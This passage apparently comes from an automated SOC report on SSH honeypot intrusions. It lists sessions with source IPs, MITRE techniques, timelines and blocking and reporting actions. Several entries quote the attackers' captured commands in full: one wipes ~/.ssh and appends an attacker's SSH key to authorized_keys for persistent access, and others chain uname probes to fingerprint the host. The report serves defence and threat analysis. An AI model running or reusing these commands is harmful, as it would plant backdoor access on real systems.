| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:22:50` | `cowrie.session.connect` |
| `2026-07-17 02:22:50` | `cowrie.client.version` |
| `2026-07-17 02:22:50` | `cowrie.client.kex` |
| `2026-07-17 02:22:50` | `cowrie.login.success` |
| `2026-07-17 02:22:51` | `cowrie.session.params` |
| `2026-07-17 02:22:51` | `cowrie.command.input` |
| `2026-07-17 02:22:51` | `cowrie.command.failed` |
| `2026-07-17 02:22:51` | `cowrie.log.closed` |
| `2026-07-17 02:22:52` | `cowrie.session.params` |
| `2026-07-17 02:22:52` | `cowrie.command.input` |
| `2026-07-17 02:22:52` | `cowrie.session.file_download` |
| `2026-07-17 02:22:52` | `cowrie.log.closed` |
| `2026-07-17 02:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.44.224[.]54` to AbuseIPDB if not already reported
- [ ] Block `173.44.224[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5281aaa4203

| Field | Detail |
|---|---|
| **Source IP** | `173.44.224[.]54` |
| **First Seen** | 2026-07-17 02:22 |
| **Last Seen** | 2026-07-17 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:22:52` | `cowrie.session.connect` |
| `2026-07-17 02:22:52` | `cowrie.client.version` |
| `2026-07-17 02:22:52` | `cowrie.client.kex` |
| `2026-07-17 02:22:53` | `cowrie.login.success` |
| `2026-07-17 02:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.44.224[.]54` to AbuseIPDB if not already reported
- [ ] Block `173.44.224[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7b7b2db69b

| Field | Detail |
|---|---|
| **Source IP** | `173.44.224[.]54` |
| **First Seen** | 2026-07-17 02:22 |
| **Last Seen** | 2026-07-17 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:22:53` | `cowrie.session.connect` |
| `2026-07-17 02:22:53` | `cowrie.client.version` |
| `2026-07-17 02:22:53` | `cowrie.client.kex` |
| `2026-07-17 02:22:54` | `cowrie.login.success` |
| `2026-07-17 02:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.44.224[.]54` to AbuseIPDB if not already reported
- [ ] Block `173.44.224[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6192b2beb6e2

| Field | Detail |
|---|---|
| **Source IP** | `121.200.54[.]19` |
| **First Seen** | 2026-07-17 02:24 |
| **Last Seen** | 2026-07-17 02:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:24:19` | `cowrie.session.connect` |
| `2026-07-17 02:24:19` | `cowrie.client.version` |
| `2026-07-17 02:24:19` | `cowrie.client.kex` |
| `2026-07-17 02:24:22` | `cowrie.login.success` |
| `2026-07-17 02:24:22` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.200.54[.]19` to AbuseIPDB if not already reported
- [ ] Block `121.200.54[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc7ffba7b05

| Field | Detail |
|---|---|
| **Source IP** | `128.185.220[.]90` |
| **First Seen** | 2026-07-17 02:24 |
| **Last Seen** | 2026-07-17 02:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:24:28` | `cowrie.session.connect` |
| `2026-07-17 02:24:28` | `cowrie.client.version` |
| `2026-07-17 02:24:28` | `cowrie.client.kex` |
| `2026-07-17 02:24:31` | `cowrie.login.success` |
| `2026-07-17 02:24:31` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.220[.]90` to AbuseIPDB if not already reported
- [ ] Block `128.185.220[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab4d5eca22a

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-17 02:27 |
| **Last Seen** | 2026-07-17 02:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:27:44` | `cowrie.session.connect` |
| `2026-07-17 02:27:44` | `cowrie.client.version` |
| `2026-07-17 02:27:44` | `cowrie.client.kex` |
| `2026-07-17 02:27:46` | `cowrie.login.success` |
| `2026-07-17 02:27:46` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a02681fc15

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-07-17 02:27 |
| **Last Seen** | 2026-07-17 02:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:27:52` | `cowrie.session.connect` |
| `2026-07-17 02:27:53` | `cowrie.client.version` |
| `2026-07-17 02:27:53` | `cowrie.client.kex` |
| `2026-07-17 02:27:55` | `cowrie.login.success` |
| `2026-07-17 02:27:56` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a51a7b1faf6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 02:29 |
| **Last Seen** | 2026-07-17 02:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:29:48` | `cowrie.session.connect` |
| `2026-07-17 02:29:48` | `cowrie.client.version` |
| `2026-07-17 02:29:48` | `cowrie.client.kex` |
| `2026-07-17 02:29:49` | `cowrie.login.success` |
| `2026-07-17 02:29:49` | `cowrie.session.params` |
| `2026-07-17 02:29:49` | `cowrie.command.input` |
| `2026-07-17 02:29:50` | `cowrie.log.closed` |
| `2026-07-17 02:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84055cf51fd7

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-07-17 02:35 |
| **Last Seen** | 2026-07-17 02:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:35:43` | `cowrie.session.connect` |
| `2026-07-17 02:35:45` | `cowrie.client.version` |
| `2026-07-17 02:35:45` | `cowrie.client.kex` |
| `2026-07-17 02:35:47` | `cowrie.login.success` |
| `2026-07-17 02:35:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c1d7755b82

| Field | Detail |
|---|---|
| **Source IP** | `200.155.66[.]2` |
| **First Seen** | 2026-07-17 02:38 |
| **Last Seen** | 2026-07-17 02:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:38:23` | `cowrie.session.connect` |
| `2026-07-17 02:38:23` | `cowrie.client.version` |
| `2026-07-17 02:38:23` | `cowrie.client.kex` |
| `2026-07-17 02:38:24` | `cowrie.login.success` |
| `2026-07-17 02:38:25` | `cowrie.session.params` |
| `2026-07-17 02:38:25` | `cowrie.command.input` |
| `2026-07-17 02:38:25` | `cowrie.command.failed` |
| `2026-07-17 02:38:25` | `cowrie.log.closed` |
| `2026-07-17 02:38:26` | `cowrie.session.params` |
| `2026-07-17 02:38:26` | `cowrie.command.input` |
| `2026-07-17 02:38:26` | `cowrie.session.file_download` |
| `2026-07-17 02:38:26` | `cowrie.log.closed` |
| `2026-07-17 02:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.155.66[.]2` to AbuseIPDB if not already reported
- [ ] Block `200.155.66[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6398c608e5

| Field | Detail |
|---|---|
| **Source IP** | `200.155.66[.]2` |
| **First Seen** | 2026-07-17 02:38 |
| **Last Seen** | 2026-07-17 02:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:38:26` | `cowrie.session.connect` |
| `2026-07-17 02:38:26` | `cowrie.client.version` |
| `2026-07-17 02:38:26` | `cowrie.client.kex` |
| `2026-07-17 02:38:26` | `cowrie.login.success` |
| `2026-07-17 02:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.155.66[.]2` to AbuseIPDB if not already reported
- [ ] Block `200.155.66[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6feb79d43807

| Field | Detail |
|---|---|
| **Source IP** | `200.155.66[.]2` |
| **First Seen** | 2026-07-17 02:38 |
| **Last Seen** | 2026-07-17 02:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:38:27` | `cowrie.session.connect` |
| `2026-07-17 02:38:27` | `cowrie.client.version` |
| `2026-07-17 02:38:27` | `cowrie.client.kex` |
| `2026-07-17 02:38:27` | `cowrie.login.success` |
| `2026-07-17 02:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.155.66[.]2` to AbuseIPDB if not already reported
- [ ] Block `200.155.66[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d07c0e175a

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-17 02:39 |
| **Last Seen** | 2026-07-17 02:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:39:11` | `cowrie.session.connect` |
| `2026-07-17 02:39:12` | `cowrie.client.version` |
| `2026-07-17 02:39:12` | `cowrie.client.kex` |
| `2026-07-17 02:39:14` | `cowrie.login.success` |
| `2026-07-17 02:39:15` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54732c736b00

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]142` |
| **First Seen** | 2026-07-17 02:45 |
| **Last Seen** | 2026-07-17 02:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:45:04` | `cowrie.session.connect` |
| `2026-07-17 02:45:04` | `cowrie.client.version` |
| `2026-07-17 02:45:04` | `cowrie.client.kex` |
| `2026-07-17 02:45:05` | `cowrie.login.success` |
| `2026-07-17 02:45:05` | `cowrie.session.params` |
| `2026-07-17 02:45:05` | `cowrie.command.input` |
| `2026-07-17 02:45:05` | `cowrie.command.failed` |
| `2026-07-17 02:45:05` | `cowrie.log.closed` |
| `2026-07-17 02:45:06` | `cowrie.session.params` |
| `2026-07-17 02:45:06` | `cowrie.command.input` |
| `2026-07-17 02:45:06` | `cowrie.session.file_download` |
| `2026-07-17 02:45:06` | `cowrie.log.closed` |
| `2026-07-17 02:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]142` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45124933e30e

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]142` |
| **First Seen** | 2026-07-17 02:45 |
| **Last Seen** | 2026-07-17 02:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:45:06` | `cowrie.session.connect` |
| `2026-07-17 02:45:06` | `cowrie.client.version` |
| `2026-07-17 02:45:06` | `cowrie.client.kex` |
| `2026-07-17 02:45:07` | `cowrie.login.success` |
| `2026-07-17 02:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]142` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f1c0ae2b757

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]142` |
| **First Seen** | 2026-07-17 02:45 |
| **Last Seen** | 2026-07-17 02:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:45:07` | `cowrie.session.connect` |
| `2026-07-17 02:45:07` | `cowrie.client.version` |
| `2026-07-17 02:45:07` | `cowrie.client.kex` |
| `2026-07-17 02:45:07` | `cowrie.login.success` |
| `2026-07-17 02:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]142` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f1dca794b9

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-07-17 02:45 |
| **Last Seen** | 2026-07-17 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:45:30` | `cowrie.session.connect` |
| `2026-07-17 02:45:31` | `cowrie.client.version` |
| `2026-07-17 02:45:31` | `cowrie.client.kex` |
| `2026-07-17 02:45:32` | `cowrie.login.success` |
| `2026-07-17 02:45:33` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9814aa6e3232

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-17 02:46 |
| **Last Seen** | 2026-07-17 02:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:46:06` | `cowrie.session.connect` |
| `2026-07-17 02:46:06` | `cowrie.client.version` |
| `2026-07-17 02:46:06` | `cowrie.client.kex` |
| `2026-07-17 02:46:07` | `cowrie.login.success` |
| `2026-07-17 02:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91b2f43a6a8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 02:48 |
| **Last Seen** | 2026-07-17 02:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:48:14` | `cowrie.session.connect` |
| `2026-07-17 02:48:14` | `cowrie.client.version` |
| `2026-07-17 02:48:15` | `cowrie.client.kex` |
| `2026-07-17 02:48:15` | `cowrie.login.success` |
| `2026-07-17 02:48:15` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:48:15` | `cowrie.direct-tcpip.data` |
| `2026-07-17 02:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83926c3c2b2

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-17 02:49 |
| **Last Seen** | 2026-07-17 02:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:49:09` | `cowrie.session.connect` |
| `2026-07-17 02:49:09` | `cowrie.client.version` |
| `2026-07-17 02:49:09` | `cowrie.client.kex` |
| `2026-07-17 02:49:11` | `cowrie.login.success` |
| `2026-07-17 02:49:12` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4f71468849

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-17 02:49 |
| **Last Seen** | 2026-07-17 02:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 02:49:22` | `cowrie.session.connect` |
| `2026-07-17 02:49:23` | `cowrie.client.version` |
| `2026-07-17 02:49:23` | `cowrie.client.kex` |
| `2026-07-17 02:49:25` | `cowrie.login.success` |
| `2026-07-17 02:49:26` | `cowrie.direct-tcpip.request` |
| `2026-07-17 02:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33410ee4c66c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:00 |
| **Last Seen** | 2026-07-17 03:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:00:47` | `cowrie.session.connect` |
| `2026-07-17 03:00:47` | `cowrie.client.version` |
| `2026-07-17 03:00:47` | `cowrie.client.kex` |
| `2026-07-17 03:00:49` | `cowrie.login.success` |
| `2026-07-17 03:00:50` | `cowrie.session.params` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.success` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:50` | `cowrie.command.input` |
| `2026-07-17 03:00:51` | `cowrie.log.closed` |
| `2026-07-17 03:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8276b52d615

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:02 |
| **Last Seen** | 2026-07-17 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:02:23` | `cowrie.session.connect` |
| `2026-07-17 03:02:24` | `cowrie.client.version` |
| `2026-07-17 03:02:24` | `cowrie.client.kex` |
| `2026-07-17 03:02:26` | `cowrie.login.success` |
| `2026-07-17 03:02:27` | `cowrie.session.params` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
